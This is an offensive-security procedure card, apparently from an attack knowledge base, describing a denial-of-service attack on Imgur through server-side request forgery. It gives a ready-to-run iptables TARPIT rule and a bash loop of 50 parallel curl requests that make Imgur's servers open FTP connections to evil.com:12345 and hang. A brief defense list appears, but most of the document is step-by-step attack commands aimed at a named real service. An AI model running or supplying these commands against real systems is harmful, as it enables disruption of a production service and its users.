---
tags:
  - ssrf
  - dos
  - ftp
type: procedure
tools:
  - '[[tools/iptables]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/iptables-tarpit-setup]]'
  - '[[commands/curl-ftp-trigger]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T03:46:08.998Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 42bb9394-e0c8-4909-b9ee-de597df45c90
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Explore-FTP-DoS-with-Iptables-Tarpit

## Summary

Configure an FTP tarpit using iptables to hold SSRF-initiated FTP connections open, exploiting libcurl's long timeouts to exhaust Imgur's connection pool and cause denial-of-service.

## Description

FTP in libcurl lacks aggressive timeouts, and combined with server-side retry logic, repeated SSRF requests to a tarpit can tie up resources. This is a resource exhaustion vector, though not fully tested in the original report.

## Requirements

1. Root access on Linux host for iptables
2. Open TCP port 12345
3. Ability to send multiple requests to Imgur

## Defense

Defensive measures and detection strategies:

- Set short timeouts for FTP and other protocols in libcurl
- Rate-limit requests to SSRF-prone endpoints
- Monitor connection counts and timeouts in app server metrics

## Objectives

1. Demonstrate resource exhaustion via long-lived FTP sessions
2. Highlight DoS potential in protocol mishandling
3. Validate scalability of attack

## Instructions

### Step 1: Set Up Iptables Tarpit

**Context**: Tarpit incoming FTP connections on port 12345.

**Command** ([[commands/iptables-tarpit-setup]]):
```bash
iptables -t mangle -A PREROUTING -p tcp --dport 12345 -j TARPIT
```

> This holds connections in SYN_RECV state indefinitely. No output; verify with netstat.

### Step 2: Trigger Multiple FTP SSRF Requests

**Context**: Flood Imgur with FTP URLs to open many connections.

**Command** ([[commands/curl-ftp-trigger]]):
```bash
for i in {1..50}; do curl "https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST" & done
```

> Runs 50 parallel requests. Expected: Connections pile up on tarpit; monitor Imgur response times.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- None

## Commands Used

- [[commands/iptables-tarpit-setup]]
- [[commands/curl-ftp-trigger]]

## Tools Used

- [[tools/iptables]]

## Tags

- [[ssrf]]
- [[dos]]
- [[ftp]]
